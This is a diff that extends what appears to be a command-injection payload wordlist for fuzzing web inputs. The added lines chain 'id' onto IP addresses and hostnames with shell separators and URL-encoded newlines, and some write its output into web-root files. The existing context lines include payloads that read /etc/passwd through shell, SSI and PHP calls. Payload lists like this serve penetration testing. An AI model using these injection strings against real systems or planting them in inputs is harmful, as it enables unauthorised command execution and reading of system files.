@@ -63,6 +63,8 @@ a|/usr/bin/id
 & ping -n 30 127.0.0.1 &
 %0a ping -i 30 127.0.0.1 %0a
 `ping 127.0.0.1`
+-c 10 127.0.0.1
+-c 10 google.com
 | id
 & id
 ; id
@@ -100,3 +102,39 @@ cat /etc/passwd
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
+127.0.0.1;id
+127.0.0.1&id
+127.0.0.1 && id
+127.0.0.1|id
+127.0.0.1%0aid
+127.0.0.1 1.1.1.1
+127.0.0.1; 1.1.1.1
+127.0.0.1&& 1.1.1.1
+127.0.0.1, 1.1.1.1
+www.nsa.gov;id
+www.nsa.gov|id
+www.nsa.gov&id
+www.nsa.gov&&id
+www.nsa.gov%0aid
+www.nsa.gov google.com
+www.nsa.gov, google.com
+;id > /var/www/html/id1.txt
+&id > /var/www/html/id2.txt
+|id > /var/www/html/id3.txt
+&&id > /var/www/html/id4.txt
+%0aid > /var/www/html/id5.txt
+;id > /var/www/id1.txt
+&id > /var/www//id2.txt
+|id > /var/www/id3.txt
+&&id > /var/www/id4.txt
+%0aid > /var/www/id5.txt
+127.0.0.1| id > /var/www/html/id1.txt
+127.0.0.1| id > /var/www/id1.txt
+127.0.0.1; id > /var/www/html/id2.txt
+127.0.0.1; id > /var/www/id2.txt
+127.0.0.1& id > /var/www/html/id3.txt
+127.0.0.1& id > /var/www/id3.txt
+127.0.0.1&& id > /var/www/html/id4.txt
+127.0.0.1&& id > /var/www/id4.txt
+127.0.0.1%0aid > /var/www/html/id5.txt
+127.0.0.1%0aid > /var/www/id5.txt
